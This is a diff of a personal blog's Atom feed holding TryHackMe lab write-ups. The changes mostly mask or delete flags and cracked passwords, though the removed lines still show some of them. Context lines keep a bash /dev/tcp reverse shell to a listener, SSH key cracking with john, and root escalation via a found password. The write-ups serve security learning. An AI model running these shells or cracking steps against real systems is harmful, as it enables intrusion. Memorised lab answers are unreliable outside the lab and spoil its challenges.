@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-04-06T00:28:47+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - Cyber Heroes</title><link href="http://localhost:4000/tryhackme-cyber-heroes/" rel="alternate" type="text/html" title="TryHackMe - Cyber Heroes" /><published>2023-03-30T00:00:00+03:00</published><updated>2023-03-30T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-cyber-heroes</id><content type="html" xml:base="http://localhost:4000/tryhackme-cyber-heroes/"><![CDATA[<p>Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-06T13:42:09+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - Cyber Heroes</title><link href="http://localhost:4000/tryhackme-cyber-heroes/" rel="alternate" type="text/html" title="TryHackMe - Cyber Heroes" /><published>2023-03-30T00:00:00+03:00</published><updated>2023-03-30T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-cyber-heroes</id><content type="html" xml:base="http://localhost:4000/tryhackme-cyber-heroes/"><![CDATA[<p>Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!</p>
 
 <p><br /></p>
 
@@ -45,9 +45,9 @@
 
     <p><img src="/assets/img/tryhackme/cyber-heroes/source.png" alt="source" /></p>
 
-    <p>As I understand it <code class="language-plaintext highlighter-rouge">username: h3ck3rBoi</code> and <code class="language-plaintext highlighter-rouge">password: RevereString("54321@terceSrepuS")</code>.</p>
+    <p>As I understand it <code class="language-plaintext highlighter-rouge">username: h3ck3rBoi</code> and <code class="language-plaintext highlighter-rouge">password: RevereString("*****@t*****r****")</code>.</p>
 
-    <p>We need to write the password in reverse. So, <code class="language-plaintext highlighter-rouge">password: SuperSecret@12345</code></p>
+    <p>We need to write the password in reverse. So, <code class="language-plaintext highlighter-rouge">password: S****S*****@*****</code></p>
   </li>
 </ul>
 
@@ -162,13 +162,11 @@
   </li>
 </ul>
 
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='</code></strong></p>
-
 <p><br /></p>
 
 <h3 id="22-what-is-charlies-password">2.2 What is Charlie’s password?</h3>
 
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: cn7824</code></strong></p>
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: c*****</code></strong></p>
 
 <p><br /></p>
 
@@ -370,7 +368,7 @@ $ ssh -i id_rsa charlie@10.10.153.7
 
 <p><img src="/assets/img/tryhackme/lazy-admin/crack-hash.png" alt="crack-hash" /></p>
 
-<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: Password123</code></strong></em></p>
+<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: *******</code></strong></em></p>
 
 <p>Now we can log in as an admin user. Let’s go to the /as/ directory and log in.</p>
 
@@ -826,7 +824,7 @@ $ show options
 
 <p><img src="/assets/img/tryhackme/easy-peasy/encode.png" alt="encode" /></p>
 
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{f1rs7_fl4g}</code></strong></p>
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{*********}</code></strong></p>
 
 <p><br /></p>
 
@@ -850,7 +848,7 @@ $ show options
 
 <p><img src="/assets/img/tryhackme/easy-peasy/crack-robots.png" alt="crack-robots" /></p>
 
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{1m_s3c0nd_fl4g}</code></strong></p>
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{********}</code></strong></p>
 
 <p><br /></p>
 
@@ -864,7 +862,7 @@ $ show options
 
 <p><img src="/assets/img/tryhackme/easy-peasy/crack-flag3.png" alt="crack-flag3" /></p>
 
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{9fdafbd64c47471a8f54cd3fc64cd312}</code></strong></p>
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{*************************}</code></strong></p>
 
 <p><br /></p>
 
@@ -910,7 +908,7 @@ $ show options
 
 <p><img src="/assets/img/tryhackme/easy-peasy/dict-source-crack.png" alt="dict-source-crack" /></p>
 
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: mypasswordforthatjob</code></strong></p>
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: **********</code></strong></p>
 
 <p><br /></p>
 
@@ -954,11 +952,9 @@ $ cat secrettext.txt
 
 <p><img src="/assets/img/tryhackme/easy-peasy/user-flag.png" alt="user-flag" /></p>
 
-<p>We found this <strong><code class="language-plaintext highlighter-rouge">synt{a0jvgf33zfa0ez4y}</code></strong>. Let’s crack it.</p>
+<p>We found this <strong><code class="language-plaintext highlighter-rouge">synt{***********}</code></strong>. Let’s crack it.</p>
 
 <p><img src="/assets/img/tryhackme/easy-peasy/rot.png" alt="rot" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{n0wits33msn0rm4l}</code></strong></p>
 
 <p><br /></p>
 
@@ -992,8 +988,6 @@ bash -i &gt;&amp; /dev/tcp/10.8.86.168/4444 0&gt;&amp;1
 <p>Yes, we have root privileges. Let’s get the root flag.</p>
 
 <p><img src="/assets/img/tryhackme/easy-peasy/root-flag.png" alt="root-flag" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{63a9f0ea7bb98050796b649e85481845}</code></strong></p>
 
 <p><br /></p>
 
@@ -1245,8 +1239,6 @@ $ get task.txt
 
 <p><img src="/assets/img/tryhackme/bounty-hacker/hydra.png" alt="hydra" /></p>
 
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: RedDr4gonSynd1cat3</code></strong></p>
-
 <p><br /></p>
 
 <h3 id="16-usertxt">1.6 user.txt</h3>
@@ -1373,7 +1365,7 @@ $ ssh2john id_rsa &gt; id_rsa.hash
 $ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
 </code></pre></div></div>
 
-<p><strong><code class="language-plaintext highlighter-rouge">Password: letmein</code></strong></p>
+<p><strong><code class="language-plaintext highlighter-rouge">Password: *****</code></strong></p>
 
 <p>Now we can log in to ssh.</p>
 
@@ -1567,7 +1559,7 @@ $ cat /home/www-data/user.txt
 
 <p><img src="/assets/img/tryhackme/ignite/linpeas.png" alt="linpeas" /></p>
 
-<p><strong><code class="language-plaintext highlighter-rouge">Password: mememe</code></strong></p>
+<p><strong><code class="language-plaintext highlighter-rouge">Password: ******</code></strong></p>
 
 <p>We found a password information, but I don’t know what it is for. But let’s try it for root.</p>
 
@@ -1575,7 +1567,7 @@ $ cat /home/www-data/user.txt
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
 $ su root
-Password: mememe
+Password: ******
 </code></pre></div></div>
 
 <p>It worked :D. We have successfully rooted.</p>
